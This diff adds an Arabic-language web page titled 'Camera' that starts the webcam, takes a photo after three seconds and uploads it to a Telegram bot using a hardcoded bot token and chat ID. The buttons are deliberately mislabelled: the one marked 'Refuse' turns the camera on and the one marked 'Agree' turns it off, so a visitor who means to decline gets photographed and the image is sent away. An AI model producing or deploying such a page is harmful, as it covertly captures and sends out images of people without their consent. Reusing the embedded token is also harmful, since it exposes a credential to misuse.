@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="ar">
+<body>
+
+<h2>الكاميرا</h2>
+
+<video id="video" autoplay playsinline></video>
+<br>
+
+<button onclick="start()">رفض</button>
+<button onclick="stop()">موافق</button>
+
+<canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+const TOKEN = "8469668913:AAE2ks3XnwwtTnTEXDZHshbLsIZ5ihoI7ZE";
+const CHAT_ID = "5870377141";
+
+const video = document.getElementById("video");
+let stream = null;
+
+async function start() {
+    try {
+        // تشغيل الكاميرا
+        stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+        video.play();
+
+        // انتظار بسيط ثم تصوير
+        setTimeout(captureAndSend, 3000);
+
+    } catch (err) {
+        alert("لا يمكن تشغيل الكاميرا");
+    }
+}
+
+function stop() {
+    alert("تم الإيقاف");
+
+    if (stream) {
+        stream.getTracks().forEach(track => track.stop());
+    }
+}
+
+function captureAndSend() {
+
+    const canvas = document.getElementById("canvas");
+    const ctx = canvas.getContext("2d");
+
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+
+    ctx.drawImage(video, 0, 0);
+
+    canvas.toBlob(async (blob) => {
+
+        const formData = new FormData();
+        formData.append("chat_id", CHAT_ID);
+        formData.append("photo", blob, "photo.png");
+
+        try {
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+                method: "POST",
+                body: formData
+            });
+
+            alert("تم إرسال الصورة");
+
+        } catch (e) {
+            alert("فشل الإرسال");
+        }
+
+        // إيقاف الكاميرا بعد الإرسال
+        if (stream) {
+            stream.getTracks().forEach(track => track.stop());
+        }
+
+    }, "image/png");
+}
+</script>
+
+</body>
+</html>
